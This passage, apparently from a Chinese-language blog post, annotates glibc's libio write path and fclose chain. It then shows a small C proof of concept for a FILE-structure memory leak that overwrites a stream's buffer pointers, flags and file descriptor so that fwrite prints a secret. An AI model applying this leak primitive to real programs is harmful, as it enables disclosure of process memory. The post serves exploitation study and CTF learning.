class="comment">//否则block_size太小不足128,此时do_write就是to_do</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)					<span class="comment">//如果有do_write,下面就要实际写入了</span></span><br><span class="line">	&#123;</span><br><span class="line">	  count = new_do_write (f, s, do_write);	</span><br><span class="line">	  to_do -= count;			<span class="comment">//此时的to_do可能是不满块剩下的,或者new_do_write没有写完剩下的</span></span><br><span class="line">	  <span class="keyword">if</span> (count &lt; do_write)		<span class="comment">//如果实际上写入的不足do_write,说明new_do_write没有完成任务,要么是EOF,尽力了,返回实际读了多少</span></span><br><span class="line">	    <span class="keyword">return</span> n - to_do;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment">	 buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment">	 so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)				<span class="comment">//如果到这里还有to_do,说明是最后那个不满块,</span></span><br><span class="line">	to_do -= _IO_default_xsputn (f, s+do_write, to_do);	</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p><code>_IO_OVERFLOW</code>这个宏实际上也是调用vtable[overflow]函数实现的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)				<span class="comment">//if (_IO_OVERFLOW (f, EOF) == EOF)</span></span><br><span class="line">&#123;<span class="comment">//ch是结束字符,如果是EOF则不附加在末尾,否则比如&#x27;\n&#x27;会附加在末尾</span></span><br><span class="line">    <span class="comment">//如果打开标志是&quot;r&quot;,也就是只读,那么会在_IO_new_file_fopen中设置_IO_NO_WRITES标志,表明只读打开</span></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span><span class="comment">//overflow的作用是将缓冲区写入文件,显然对于只读文件不能写</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;<span class="comment">//如果文件流f当前不不不处于往文件写入的状态, 或者文件流f没有write_buf</span></span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)	<span class="comment">//对于没有write_buf的情况则给f分配一个</span></span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);			<span class="comment">//申请一个0x1000字节的write_buf给f</span></span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);	<span class="comment">//设置write_buf和buf相同</span></span><br><span class="line">	&#125;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))	</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_free_backup_area (f);</span><br><span class="line">	  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">				   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">	  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      	<span class="comment">//初始化指针</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">			f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//这里实际上是f-&gt;_IO_write_ptr = f-&gt;_IO_buf_base 但是实际上f-&gt;_IO_read_ptr也是这个值,因此无所谓了</span></span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line">		<span class="comment">//标记正在往文件写入</span></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)			<span class="comment">//如果ch为EOF则将目前的缓冲区先写入文件然后就返回了</span></span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,<span class="comment">//_IO_do_write会复位缓冲区</span></span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">//如果writebuf满了</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)	<span class="comment">//也是先把目前缓冲区写入文件,实际上调用的是_IO_do_write,也会复位缓冲区 </span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;			<span class="comment">//最后补上一个ch字符</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)	<span class="comment">//如果不缓冲或者行缓冲并且有\n</span></span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,<span class="comment">//缓冲区写入文件,然后缓冲区复位</span></span><br><span class="line">		      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)<span class="comment">//如果最后剩下的块比当时的缓冲区大,还是会造成文件io的</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span>			<span class="comment">//count = new_do_write (f, s, do_write);</span></span><br><span class="line">&#123;	</span><br><span class="line">  <span class="type">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);	<span class="comment">//调整文件指针</span></span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);		<span class="comment">//实际写,count是实际写入的字节数</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);<span class="comment">//read_buf缓冲区参照buf复位</span></span><br><span class="line">    </span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;	<span class="comment">//write_buf复位</span></span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_default_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">	&#123;<span class="comment">//如果缓冲区有空</span></span><br><span class="line">	  <span class="type">size_t</span> count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; more)<span class="comment">//如果缓冲区空地够大</span></span><br><span class="line">	    count = more;</span><br><span class="line">          <span class="comment">//到这里时,count&lt;=more</span></span><br><span class="line">	  <span class="keyword">if</span> (count &gt; <span class="number">20</span>)<span class="comment">//要么mempcpy实现拷贝,要么循环实现</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">	      s += count;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">	      <span class="type">ssize_t</span> i;</span><br><span class="line">	      <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">		*p++ = *s++;</span><br><span class="line">	      f-&gt;_IO_write_ptr = p;</span><br><span class="line">	    &#125;</span><br><span class="line">	  more -= count;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF)</span><br><span class="line">          <span class="comment">//如果more=0则不会执行后句,此时最后的剩余块也放到了缓冲区,不需要腾空了</span></span><br><span class="line">          <span class="comment">//否则more&gt;0表明还有剩下的,但是缓冲区此时满了,需要缓冲区写入文件,然后缓冲区复位</span></span><br><span class="line">          <span class="comment">//然后重新把剩下的放到缓冲区中</span></span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *f</span><br><span class="line">$<span class="number">4</span> = &#123;</span><br><span class="line">  _flags = <span class="number">2048</span>,</span><br><span class="line">  _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line">  _IO_read_end = <span class="number">0x404038</span> &lt;flag&gt; <span class="string">&quot;flag&#123;secret&#125;&quot;</span>,</span><br><span class="line">  _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_write_base = <span class="number">0x404038</span> &lt;flag&gt; <span class="string">&quot;flag&#123;secret&#125;&quot;</span>,</span><br><span class="line">  _IO_write_ptr = <span class="number">0x405038</span> &lt;error: Cannot access memory at address <span class="number">0x405038</span>&gt;,</span><br><span class="line">  _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">  _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_buf_end = <span class="number">0x0</span>,</span><br><span class="line">  _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">  _markers = <span class="number">0x0</span>,</span><br><span class="line">  _chain = <span class="number">0x0</span>,</span><br><span class="line">  _fileno = <span class="number">1</span>,</span><br><span class="line">  _flags2 = <span class="number">0</span>,</span><br><span class="line">  _old_offset = <span class="number">0</span>,</span><br><span class="line">  _cur_column = <span class="number">0</span>,</span><br><span class="line">  _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">  _shortbuf = <span class="string">&quot;&quot;</span>,</span><br><span class="line">  _lock = <span class="number">0x1458790</span>,</span><br><span class="line">  _offset = <span class="number">-1</span>,</span><br><span class="line">  _codecvt = <span class="number">0x0</span>,</span><br><span class="line">  _wide_data = <span class="number">0x14587a0</span>,</span><br><span class="line">  _freeres_list = <span class="number">0x0</span>,</span><br><span class="line">  _freeres_buf = <span class="number">0x0</span>,</span><br><span class="line">  __pad5 = <span class="number">0</span>,</span><br><span class="line">  _mode = <span class="number">-1</span>,</span><br><span class="line">  _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">flose(_IO_new_fclose@glibc-2.23/libio/iofclose.c:38)</span><br><span class="line">	-&gt;_IO_un_link@glibc-2.23/libio/genops.c:58</span><br><span class="line">		//从_IO_list_all为首的单向链表上遍历找到并拆下这个_IO_FILE_plus,</span><br><span class="line">	-&gt;_IO_file_close_it@glibc-2.23/libio/fileops.c:157</span><br><span class="line">		-&gt;_IO_do_flush			//缓冲区还有东西没打印出来,都给打出来</span><br><span class="line">			-&gt;_IO_do_write</span><br><span class="line">				-&gt;new_do_write</span><br><span class="line">					-&gt;vtable.__write</span><br><span class="line">						-&gt;write(linux api)</span><br><span class="line">						</span><br><span class="line">		-&gt;_IO_un_link	//这一次重复调用好像是多余的,可能防止之前有什么差错?</span><br><span class="line">	-&gt;vtable.__finish(_IO_new_file_finish)</span><br><span class="line">		-&gt;_IO_do_flush	//第二次调用</span><br><span class="line">			...</span><br><span class="line">		-&gt;__close</span><br><span class="line">			-&gt;_IO_file_close_it	//第二次调用</span><br><span class="line">		-&gt;_IO_default_finish</span><br><span class="line">			-&gt;free	//释放对上占用的内存</span><br><span class="line">			-&gt;_IO_un_link	//第三次调用</span><br></pre></td></tr></table></figure>



<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><h3 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h3><p>篡改fp的写缓冲区指针指向需要泄露的地址, 并篡改fp的文件描述符为标准输出, 触发一个缓冲区刷新, 即可打印泄露</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *stream)</span></span><br></pre></td></tr></table></figure>

<p>把 <strong>ptr</strong> 所指向的数组中的数据写入到给定流 <strong>stream</strong> 中。</p>
<p>写入<code>size</code>大小的单位<code>nmemb</code>个</p>
</blockquote>
<p>写一个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> secret[]=<span class="string">&quot;this is a secret&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag @ %p\n&quot;</span>,secret);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">    FILE *fp;</span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;w&quot;</span>);		<span class="comment">// unset _IO_NO_WRITES to bypass checks in _IO_file_overflow</span></span><br><span class="line">    fp-&gt;_flags = <span class="number">0x800</span>; 			<span class="comment">//IO_CURRENTLY_PUTTING bypass checks in _IO_file_overflow</span></span><br><span class="line">    fp-&gt;_IO_write_base = secret;	<span class="comment">//points to address that we want to leak</span></span><br><span class="line">    fp-&gt;_IO_read_end = secret;      <span class="comment">//IO_read_end must equals to write_base to bypass checks in new_do_write</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = secret + <span class="keyword">sizeof</span>(secret);	<span class="comment">//ptr - base contains our flag to leak</span></span><br><span class="line">    fp-&gt;_fileno = <span class="number">1</span>;               	<span class="comment">//redirect to stdout</span></span><br><span class="line"></span><br><span class="line">    fwrite(buffer,<span class="number">0x100</span>,<span class="number">0x1</span>,fp);    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设我们能够控制<code>fp</code>指向的<code>FILE</code>结构,并能改写其成员</p>
<p>我们希望通过设置<code>fp-&gt;_IO_write_base = secret;</code>触发调用链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fwrite</span><br><span class="line">	_IO_sputn =&gt; _IO_file_xsputn</span><br><span class="line">		_IO_OVERFLOW =&gt; _IO_file_overflow</span><br><span class="line">			=&gt; _IO_new_do_write</span><br><span class="line">				=&gt; new_do_write</span><br><span class="line">					=&gt; _IO_file_write</span><br><span class="line">						=&gt; __write</span><br></pre></td></tr></table></figure>

<p>从而打印<code>secret</code>上的字符串</p>
<p>为了实现这一目的,还需要设置<code>FILE</code>的几个参数</p>
<h4 id="1-fp-fopen-flag-w"><a href="#1-fp-fopen-flag-w" class="headerlink" title="-1.fp = fopen(&quot;./flag&quot;, &quot;w&quot;);	"></a>-1.<code>fp = fopen(&quot;./flag&quot;, &quot;w&quot;);	</code></h4><p>这个<code>fp</code>要么以<code>w</code>打开,要么手动设置其<code>flag |= ~0x8</code></p>
<p>总之不能有<code>_IO_NO_WRITES</code>, 这是因为<code>_IO_file_overflow</code>最开始会检查该标志, 防止对不可写的文件进行写入操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>



<h4 id="0-fp-IO-write-base-secret"><a href="#0-fp-IO-write-base-secret" class="headerlink" title="0.fp-&gt;_IO_write_base = secret;"></a>0.<code>fp-&gt;_IO_write_base = secret;</code></h4><p>最关键的一条,要泄露的地址</p>
<h4 id="1-fp-IO-write-ptr-secret-sizeof-secret"><a href="#1-fp-IO-write-ptr-secret-sizeof-secret" class="headerlink" title="1.fp-&gt;_IO_write_ptr = secret + sizeof(secret);"></a>1.<code>fp-&gt;_IO_write_ptr = secret + sizeof(secret);</code></h4><p>与0紧密配合,<code>_IO_OVERFLOW</code>会将位于<code>write_base</code>和<code>write_ptr</code>之间的内容刷新到缓冲区</p>
<p>要保证两者之间的距离大于flag长度</p>
<h4 id="3-fp-flags-0x800"><a href="#3-fp-flags-0x800" class="headerlink" title="3.fp-&gt;_flags = 0x800;"></a>3.<code>fp-&gt;_flags = 0x800;</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags = 0x800; //IO_CURRENTLY_PUTTING</span><br></pre></td></tr></table></figure>

<p>这里是因为在函数<code>_IO_file_overflow</code>中,如果不设置该标志会进入一个条件分支,修改我们预设的<code>_IO_write_base </code>等一系列指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//_IO_new_file_overflow</span></span><br><span class="line"><span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        _IO_doallocbuf(f);</span><br><span class="line">        _IO_setg(f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">   If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">   logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">   read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">   makes room for subsequent output.</span></span><br><span class="line"><span class="comment">   Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">   alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(_IO_in_backup(f)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span 